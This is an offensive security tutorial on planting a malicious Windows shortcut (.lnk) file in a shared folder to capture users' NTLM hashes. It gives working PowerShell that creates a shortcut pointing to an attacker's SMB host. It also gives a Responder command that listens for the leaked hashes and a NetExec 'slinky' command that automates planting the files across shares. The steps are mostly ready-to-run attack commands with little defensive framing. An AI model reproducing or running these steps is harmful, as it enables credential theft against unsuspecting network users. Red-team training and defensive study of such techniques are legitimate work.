# Watering Hole Attack with Malicious Files in Shared Folders

## Overview

Placing a malicious file in a shared folder can result in significant exploitation opportunities. This technique is akin to a Watering Hole attack, where unsuspecting users access the malicious file.

This attack works particularly well when combined with tools like Responder, which can capture hashes when users interact with the malicious file.
## Steps

### 1. Create a Malicious File Using PowerShell

If you have access to a shared folder, you can use PowerShell to create a malicious file that unsuspecting users might click on. The PowerShell commands below will generate a shortcut (.lnk) file.

```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.163.15\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

**Note:** The `TargetPath` should point to the IP of your Kali machine.

You can also add special characters to the filename to ensure it appears at the top of the shared folder.

### 2. Upload Malicious File to the Share

Once the malicious file is generated, it can be uploaded to any accessible file share within the environment, provided the attacker has sufficient privileges.

![](../../../Images/Pasted%20image%2020250224171214.png)

### 3. Run Responder to Capture Hashes

On your Kali machine, run Responder using the following command to listen for hashes.

```bash
sudo responder -I eth0 -dP
```

When a user clicks on the malicious file from their workstation, Responder will capture the hash.

![](../../../Images/Pasted%20image%2020250224171724.png)

### 4. Automate the Attack with NetExec

To automate the attack, you can use NetExec. This will automate the SMB relay attack to capture the user's credentials.

```bash
netexec smb <targethost ip> -d <domain> -u <user> -p <password> -M slinky -o NAME=test SERVER=<kali>
```